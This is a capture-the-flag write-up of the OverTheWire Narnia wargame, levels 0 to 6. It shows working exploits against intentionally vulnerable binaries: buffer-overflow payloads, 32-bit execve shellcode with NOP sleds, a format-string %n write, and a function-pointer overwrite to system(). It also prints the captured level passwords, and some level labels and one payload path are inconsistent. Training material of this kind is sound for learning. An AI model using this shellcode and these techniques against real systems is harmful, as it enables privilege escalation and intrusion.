---
title: "[OTW] Narnia Write-Up"
permalink: /writeups/otw/narnia/
layout: single
sidebar:
  nav: narnia
---

#### Narnia 00 Solution

We're given the following source code:
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if (val==0xdeadbeef) {
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    } else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
It seemed like a classic buffer overflow problem. I confirmed this by passing in 28 a's and noticed that 'val' changed from 0x41414141 to 0x61616161 (aaaa in hex):
```html
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaaaaaaaaaa
buf: aaaaaaaaaaaaaaaaaaaaaaaa
val: 0x61616161
WAY OFF!!!!
```
Now it was just a matter of finding the offset of 'val' from the end of the buffer. I figured this out by passing in 20 a's and then appended b's in multiples of 4 until 'val' first changes. Coincidentally, val is stored directly after buf on the stack:
```html
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaabbbb
buf: aaaaaaaaaaaaaaaaaaaabbbb
val: 0x62626262
WAY OFF!!!!
```
Now that I know where val is, I can overflow it with whatever value I want. Based on the source code, setting val to 0xdeadbeef will give me control over the shell. Unfortunately, the following won't work:
```html
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaadeadbeef
buf: aaaaaaaaaaaaaaaaaaaadead
val: 0x64616564
WAY OFF!!!!
```
The comparison should be with the actual hex value \xde \xad \be \ef which I will pipe into the program:
```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"a" * 20 + b"\xef\xbe\xad\xde")' | /narnia/narnia0
```
```html
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
val: 0xdeadbeef
```
Now there's no more "WAY OFF!!!!" but the program immediately exits. A nice trick we can do to keep the program running is through 'cat':
```bash
(python3 -c 'import sys;sys.stdout.buffer.write(b"a" * 20 + b"\xef\xbe\xad\xde")' && cat) | /narnia/narnia0
```
Now we get access to the shell:
```html
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
val: 0xdeadbeef
whoami
narnia1
```
Running the following command gives us the password:
```html
cat /etc/narnia_pass/narnia1
WDcYUTG5ul
```

#### Narnia 01 Solution

We're given the following source code:
```c
#include <stdio.h>

int main(){
    int (*ret)();

    if (getenv("EGG")==NULL) {
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
I first wondered if I could set an environment variable from the terminal, which I found out was possible by using the 'export' keyword. For example:
```bash
export EGG="1"
```
This worked since I'm no longer getting the "Give me something to execute at the env-variable EGG\n" message:
```html
Trying to execute EGG!
Segmentation fault (core dumped)
```
Now, it was a matter of what to set EGG environment variable to. My first though was to get ret() to call system("/bin/sh") which would hopefully give me control over the shell: 
```bash
export EGG = 'system("/bin/sh")'
```
Unfortunately, this did not work since EGG was just ASCII characters in memory, not actual CPU instructions. I then thought about injecting actual machine code so when ret() is called it will be able to execute any instructions we want it to. So I went and searched up shell code for a 32-bit machine:
```bash
export EGG=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
```
I managed to gain control over the shell however for some reason I was still narnia1:
```html
Trying to execute EGG!
$ whoami
narnia1
```
I reflected back to narnia0 where before gaining control of the shell, the program set its real userId to the effective userId. I used a similar approach by calling "/bin/bash" with the -p flag which tells the shell to keep its privileged access. Here is the shellcode:
```bash
export EGG=$'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80\x90'
```
I am now narnia2 and have access to the password:
```html
Trying to execute EGG!
bash-5.2$ whoami
narnia2
bash-5.2$ cat /etc/narnia_pass/narnia2
5agRAXeBdG
```

#### Narnia 03 Solution

We're given the following source code:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
It seemed like another buffer overflow exploit, since strcpy did not specify how many characters to read. I confirmed this by passing in 132 A's:
```bash
narnia2@gibson:~$ /narnia/narnia2 $(python3 -c 'print("A" * 132)')
Segmentation fault (core dumped)
```
Next, I checked if the binary was executable:
```html
narnia2@gibson:~$ file /narnia/narnia2
/narnia/narnia2: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cbf210f5149351ddfcc3a33ac83f5494225a65dd, for GNU/Linux 3.2.0, not stripped
```
This meant I could inject shellcode into the buffer and then execute it. To do this, I needed to overwrite the EIP register. I found the EIP register by using gdb:
```html
pwndbg> r $(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*132 + b"B"*4)')
```

![Index html](/assets/images/narnia/02-1.png)

Now that I know the offset of EIP was 132, I could replace 'BBBB' with the address of my shellcode in the buffer. We will use a technique known as 'NOP sled' and replace all A's with '\x90' which is the machine code for 'no instruction'. The shellcode we will be using is the same one as the previous level (with -p flag). We will also place our shellcode at the end of our 'NOP sled' and change EIP to be somewhere in the middle of our 'NOP sled'. This is what our final payload will look like:
```bash
/narnia/narnia2 $(python3 -c 'import sys;sys.stdout.buffer.write(b"\x90"*99 + b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + b"\x70\xd5\xff\xff")')
```
Running this gives us control of the shell, and thus the password:
```html
bash-5.2$ whoami
narnia3
bash-5.2$ cat /etc/narnia_pass/narnia3
2xszzNl6uG
```

#### Narnia 04 Solution

Credentials: iqNWNk173q

We're given the following source code:
```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```
This level seems similar to level 3. After experimenting with different inputs, I was able to cause a segfault which indicates a potential buffer overflow vulnerability:
```bash
narnia4@gibson:/narnia$ ./narnia4 $(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*264 + b"B"*4)')
Segmentation fault (core dumped)
```
Running the program with gdb, I was able to find the offset of EIP:

![Index html](/assets/images/narnia/04-1.png)

Now I just needed to find an address to jump to, which will be in the middle of our NOP sled. Note, our NOP sled appears twice so we will try jumping to the middle of both NOP sleds and take the one that works:

![Index html](/assets/images/narnia/04-2.png)

Unfortunately, taking an address from the middle of the 1st NOP sled (0xffffd1d4) results in a segfault so we will try the other NOP sled.

![Index html](/assets/images/narnia/04-3.png)

The address 0xffffd524 works!

Now I could use a similar technique to level 3 by storing shellcode in the buffer, and then change the return address to jump the shellcode. This is our final payload:
```bash
/narnia/narnia2 $(python3 -c 'import sys;sys.stdout.buffer.write(b"\x90"*231 + b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + b"\x24\xd5\xff\xff")')
```

```bash
bash-5.2$ whoami
narnia5
bash-5.2$ cat /etc/narnia_pass/narnia5
Ni3xHPEuuw
```

### Narnia 05 Solution

Credentials: Ni3xHPEuuw

We're given a program that writes user input to a buffer and prints the address of the variable i:
```bash
narnia5@gibson:/narnia$ ./narnia5 10
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [10] (2)
i = 1 (0xffffd3c0)
```
We're given the following source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
    int i = 1;
    char buffer[64];

    snprintf(buffer, sizeof buffer, argv[1]);
    buffer[sizeof (buffer) - 1] = 0;
    printf("Change i's value from 1 -> 500. ");

    if(i==500){
            printf("GOOD\n");
    setreuid(geteuid(),geteuid());
            system("/bin/sh");
    }

    printf("No way...let me give you a hint!\n");
    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
    printf ("i = %d (%p)\n", i, &i);
    return 0;
}
```
The first thing that I notice is I need to overwrite the value of i to 500 to gain control of the shell, however, i is hardcoded to 1. I also notice a format string vulnerability with sprintf() as there is no format specifier provided. I confirmed this with the following payload:
```bash
narnia5@gibson:/narnia$ ./narnia5 %x.%x.%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f7fc7500.30303537.3330332e] (26)
i = 1 (0xffffd3b0)
```
which indicates a format string vulnerability since addresses like f7fc7500 are being leaked from the buffer output.
I noticed that the address of i changed depending on the payload the program was given.
Base address was 0xffffd380
Starting from $(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72)'), every 16 characters, address of i decrements by 10
'$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72)')' -> 0xffffd370
'$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*88)')' -> 0xffffd360

Using the following payload:
```bash
narnia5@gibson:/narnia$ ./narnia5 AAAA.%x.%x.%x.%x.%x.%x.%x.%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA.41414141.3431342e.34313431.34332e31.34333133.332e6532.3331] (63)
i = 1 (0xffffd3a0)
```
we find that AAAA is the 1st argument on the stack because 41414141 is AAAA in hex. Now that we know this, we can use %n to overwrite memory on the stack, and the piece of memory that we need to overwrite is the address of i.

We'll start with a simple payload:
```bash
$(python3 -c 'import sys;sys.stdout.buffer.write(b"\xb0\xd3\xff\xff%n")')
```
This changed the value of i to 4, because %n uses the number of bytes it has read so far:
```bash
narnia5@gibson:/narnia$ ./narnia5 $(python3 -c 'import sys;sys.stdout.buffer.write(b"\xb0\xd3\xff\xff%n")')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [����] (4)
i = 4 (0xffffd3b0)
```
Now we can use a neat trick to write large values:
```bash
narnia5@gibson:/narnia$ ./narnia5 $(python3 -c 'import sys;sys.stdout.buffer.write(b"\xb0\xd3\xff\xff%496d%1$n")')
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6    
BNSjoSDeGL
```

### Narnia 06 Solution

Credentials: BNSjoSDeGL

We're given the following source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int  (*fp)(char *)=(int(*)(char *))&puts, i;

    if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

    /* clear environ */
    for(i=0; environ[i] != NULL; i++)
            memset(environ[i], '\0', strlen(environ[i]));
    /* clear argz    */
    for(i=3; argv[i] != NULL; i++)
            memset(argv[i], '\0', strlen(argv[i]));

    strcpy(b1,argv[1]);
    strcpy(b2,argv[2]);
    //if(((unsigned long)fp & 0xff000000) == 0xff000000)
    if(((unsigned long)fp & 0xff000000) == get_sp())
            exit(-1);
    setreuid(geteuid(),geteuid());
    fp(b1);

    exit(1);
}
```

The first thing that stands out is that fp is a function pointer to puts. Playing around with the program, AAAAAAAACCCC seems to overwrite the value of fp.

![Index html](/assets/images/narnia/06-1.png)

What we can do now is overwrite fp to point to the system() function from the stdlib. Below is how we can find the address of system():
```bash
pwndbg> p system
$1 = {int (const char *)} 0xf7dcd430 <__libc_system>
pwndbg> 
```
All we need to do now is pass in "sh;" to our system() call, which we can do easily since the program allows us to write to a buffer. Below is our final payload:
```bash
narnia6@gibson:/narnia$ ./narnia6 $(python3 -c 'import sys;sys.stdout.buffer.write(b"sh;" + b"A"*5 + b"\x30\xd4\xdc\xf7")') CCCC
```
We now have full control over the shell:
```bash
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7        
54RtepCEU0
```
